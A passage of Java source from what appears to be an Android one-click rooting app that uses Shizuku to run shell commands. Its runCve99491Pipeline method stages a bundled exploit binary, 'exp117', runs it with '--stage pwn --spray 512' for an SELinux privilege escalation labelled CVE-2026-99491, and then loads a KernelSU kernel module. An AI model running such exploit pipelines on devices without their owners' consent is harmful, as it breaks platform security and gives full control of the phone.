                new Thread(() -> drainProcessStream(p, false, stdout), "honor-stdout"),
                new Thread(() -> drainProcessStream(p, true, stderr), "honor-stderr")
        };
        for (Thread reader : readers) reader.start();
        boolean exited = p.waitFor(20, TimeUnit.MINUTES);
        int code = exited ? p.exitValue() : -1;
        if (!exited) p.destroy();
        for (Thread reader : readers) reader.join(10000);
        String out = new String(stdout.toByteArray(), StandardCharsets.UTF_8);
        String err = new String(stderr.toByteArray(), StandardCharsets.UTF_8);
        if (code != 0)
            logError("命令返回 " + code + (err.isBlank() ? "" : "：" + err.trim()));
        else if (!err.isBlank())
            log("stderr: " + err.trim());
        if (!exited) throw new IllegalStateException("shell 命令执行超时");
        return out + err;
    }

    private Process shellProcess(String command) throws Exception {
        IBinder binder = Shizuku.getBinder();
        if (binder == null || !binder.pingBinder())
            throw new IllegalStateException("Shizuku binder 不可用");
        IShizukuService service = IShizukuService.Stub.asInterface(
                new ShizukuBinderWrapper(binder));
        IRemoteProcess remote = service.newProcess(
                new String[]{"sh", "-c", command},
                new String[]{"PATH=/system/bin:/system/xbin:/data/adb/ksu/bin",
                        "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp",
                        "HONOR_WORK=" + (WORK == null ? "/data/local/tmp/honor" : WORK)},
                "/data/local/tmp");
        if (remote == null) throw new IllegalStateException("Shizuku 拒绝启动 shell");
        return new RemoteProcess(remote);
    }

    private void stageAsset(String name, String dest, String mode) throws Exception {
        Process p = shellProcess("cat > '" + dest + "'; chmod " + mode + " '" + dest + "'");
        try (InputStream in = getAssets().open(name); OutputStream out = p.getOutputStream()) {
            byte[] buffer = new byte[65536];
            int n;
            while ((n = in.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            out.flush();
        }
        int code = p.waitFor();
        if (code != 0) {
            String error = readAll(p.getErrorStream());
            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
            throw new IllegalStateException("stage failed: " + name);
        }
    }

    private void prepareWorkDirectory() throws Exception {
        String candidate = "/data/local/tmp/honor-run-"
                + Long.toHexString(System.nanoTime());
        shell("mkdir -m 711 '" + candidate + "'");
        String check = shell("test -d '" + candidate
                + "' && test -w '" + candidate + "' && echo WORKDIR_OK");
        if (!check.contains("WORKDIR_OK"))
            throw new IllegalStateException("无法创建可写工作目录：" + candidate);
        WORK = candidate;
        log("staging=" + WORK);
    }

    private void stageBytes(String name, byte[] data, String mode) throws Exception {
        Process p = shellProcess("cat > '" + WORK + "/" + name + "'; chmod " + mode + " '" + WORK + "/" + name + "'");
        try (OutputStream out = p.getOutputStream()) { out.write(data); out.flush(); }
        int code = p.waitFor();
        if (code != 0) {
            String error = readAll(p.getErrorStream());
            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
            throw new IllegalStateException("stage bytes failed: " + name);
        }
    }

    private byte[] readAsset(String name) throws Exception {
        try (InputStream in = getAssets().open(name)) { return readAllBytes(in); }
    }

    private static byte[] readAllBytes(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(in, out);
        return out.toByteArray();
    }

    private static String readAll(InputStream in) throws Exception {
        return new String(readAllBytes(in), StandardCharsets.UTF_8);
    }

    private static void copy(InputStream in, OutputStream out) throws Exception {
        byte[] b = new byte[65536]; int n;
        while ((n = in.read(b)) > 0) out.write(b, 0, n);
    }

    private static void drainProcessStream(
            Process process, boolean stderr, OutputStream out) {
        try {
            InputStream in = stderr
                    ? process.getErrorStream() : process.getInputStream();
            copy(in, out);
        } catch (Throwable ignored) {
        }
    }

    private static String hex(long v) { return "0x" + Long.toHexString(v); }
    private static String emptyAsUnknown(String s) {
        return s == null || s.isEmpty() ? "未知" : s;
    }
    private static String toHex(byte[] bytes) {
        StringBuilder out = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) out.append(String.format("%02x", b & 0xff));
        return out.toString();
    }
    private static byte[] hexToBytes(String hex) {
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++)
            out[i] = (byte)Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        return out;
    }

    private static final class RemoteProcess extends Process {
        private final IRemoteProcess remote;
        private OutputStream stdin;
        private InputStream stdout;
        private InputStream stderr;
        private Integer exitCode;

        RemoteProcess(IRemoteProcess remote) { this.remote = remote; }

        @Override
        public synchronized OutputStream getOutputStream() {
            if (stdin == null) {
                try {
                    stdin = new ParcelFileDescriptor.AutoCloseOutputStream(
                            remote.getOutputStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stdin 失败", t);
                }
            }
            return stdin;
        }

        @Override
        public synchronized InputStream getInputStream() {
            if (stdout == null) {
                try {
                    stdout = new ParcelFileDescriptor.AutoCloseInputStream(
                            remote.getInputStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stdout 失败", t);
                }
            }
            return stdout;
        }

        @Override
        public synchronized InputStream getErrorStream() {
            if (stderr == null) {
                try {
                    stderr = new ParcelFileDescriptor.AutoCloseInputStream(
                            remote.getErrorStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stderr 失败", t);
                }
            }
            return stderr;
        }

        @Override
        public synchronized int waitFor() throws InterruptedException {
            try {
                exitCode = remote.waitFor();
                return exitCode;
            } catch (Throwable t) {
                throw new RuntimeException("等待远程进程失败", t);
            }
        }

        @Override
        public synchronized boolean waitFor(long timeout, TimeUnit unit)
                throws InterruptedException {
            try {
                boolean exited = remote.waitForTimeout(timeout, unit.toString());
                if (exited) exitCode = remote.exitValue();
                return exited;
            } catch (Throwable t) {
                throw new RuntimeException("限时等待远程进程失败", t);
            }
        }

        @Override
        public synchronized int exitValue() {
            try {
                if (exitCode == null) exitCode = remote.exitValue();
                return exitCode;
            } catch (Throwable t) {
                throw new IllegalThreadStateException("远程进程仍在运行");
            }
        }

        @Override
        public void destroy() {
            try {
                remote.destroy();
            } catch (Throwable ignored) {}
        }

        @Override
        public boolean isAlive() {
            try {
                return remote.alive();
            } catch (Throwable ignored) {
                return false;
            }
        }
    }

    private void stage(String name) {
        stage(name, Math.min(94, progressValue + 10));
    }

    private void stage(String name, int targetProgress) {
        progress(Math.max(progressValue, Math.min(100, targetProgress)));
        ui.post(() -> uiState.startStage(name));
    }

    private void progress(int p) {
        progressValue = p;
        ui.post(() -> uiState.setProgress(p));
    }

    private void log(String s) {
        Log.i("HOneClick", s);
        ui.post(() -> uiState.appendLog(s, false));
    }

    private void logError(String s) {
        Log.e("HOneClick", s);
        ui.post(() -> uiState.appendLog(s, true));
    }

    private void setKernelState(String label, StatusTone tone) {
        ui.post(() -> uiState.updateManager(label, uiState.getManagerInstalled(), tone));
    }

    private void setSystemStatus(String title, String detail, boolean active) {
        setSystemStatus(title, detail,
                active ? StatusTone.READY : StatusTone.RUNNING, active);
    }

    private void setSystemStatus(String title, String detail, StatusTone tone, boolean active) {
        ui.post(() -> uiState.setStatus(title, detail, tone, active));
    }

    private void runCve99491Pipeline(String kernel) throws Exception {
        if (!SupportedKernels.supports99491(kernel))
            throw new IllegalStateException("当前内核不支持 CVE-2026-99491：" + kernel);
        stage("准备 CVE-2026-99491 组件");
        stageAsset("exp117", WORK + "/exp117", "755");
        stageAsset("ko_patch", WORK + "/ko_patch", "755");
        stageAsset(BuildConfig.ROOT_MANAGER_SYMS_ASSET,
                WORK + "/ko_syms-117.txt", "644");
        stageAsset(BuildConfig.ROOT_MANAGER_LKM_ASSET,
                WORK + "/ksu-template-117.ko", "644");
        shell("cp " + WORK + "/ko_patch " + WORK + "/ko_syms-117.txt "
                + WORK + "/ksu-template-117.ko " + WORK + "/ksud "
                + WORK + "/root_stage.sh /data/local/tmp/"
                + " && chmod 755 /data/local/tmp/ko_patch /data/local/tmp/ksud"
                + " /data/local/tmp/root_stage.sh"
                + " && chmod 644 /data/local/tmp/ko_syms-117.txt"
                + " /data/local/tmp/ksu-template-117.ko");

        stage("执行 CVE-2026-99491 SELinux 提权");
        String out = shell("cd " + WORK
                + " && ./exp117 --stage pwn --no-avc --spray 512");
        logImportantLines(out, "");
        if (!out.contains("LOADKSU DONE module_live=1"))
            throw new IllegalStateException("99491 permissive/模块加载失败");

        stage("初始化 " + MANAGER_NAME + " 用户态");
        String grant = initializeKernelSU();
        log(grant.trim());
    }

    private void showRootReady() {
        ui.post(() -> {
            uiState.setRootReady(true);
            uiState.updateManager("运行中", isOfficialManagerInstalled(), StatusTone.SUCCESS);
            uiState.setStatus("Root 已就绪",
                    MANAGER_NAME + " root fd 验收通过 · 本次启动有效",
                    StatusTone.SUCCESS, true);
        });
    }

    private void launchPackage(String pkg) {
        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
        if (i != null) startActivity(i);
        else Toast.makeText(this, "未安装：" + pkg, Toast.LENGTH_LONG).show();
    }
}
